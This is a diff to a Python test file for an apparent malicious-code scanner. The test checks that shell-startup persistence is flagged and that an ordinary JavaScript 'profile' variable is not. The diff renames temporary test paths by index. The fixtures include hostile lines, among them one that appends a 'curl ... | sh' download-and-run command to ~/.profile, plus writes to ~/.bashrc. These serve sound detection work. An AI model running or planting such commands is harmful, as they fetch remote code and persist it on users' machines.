@@ -93,13 +93,15 @@ def test_a_whole_environment_copy_is_still_flagged_even_in_a_file_that_cannot_se
 def test_a_profile_member_is_not_a_startup_file_and_a_real_profile_write_is(tmp_path):
     ordinary = "const most = Math.max(...profile.map(([, r]) => r));\nconst p = options.profile;\n"
     assert _quiet(_findings(tmp_path / "a", {"lib/lathe.mjs": ordinary}), "persistence")
-    for hostile in (
-        "echo 'curl http://203.0.113.9/p | sh' >> ~/.profile\n",
-        "cat payload >> $HOME/.profile\n",
-        "echo evil >> ~/.bashrc\n",
-        "source .profile\n",
+    for index, hostile in enumerate(
+        (
+            "echo 'curl http://203.0.113.9/p | sh' >> ~/.profile\n",
+            "cat payload >> $HOME/.profile\n",
+            "echo evil >> ~/.bashrc\n",
+            "source .profile\n",
+        )
     ):
-        assert _loud(_findings(tmp_path / hostile[:8], {"setup.sh": hostile}), "persistence"), (
+        assert _loud(_findings(tmp_path / f"h{index}", {"setup.sh": hostile}), "persistence"), (
             hostile
         )
 
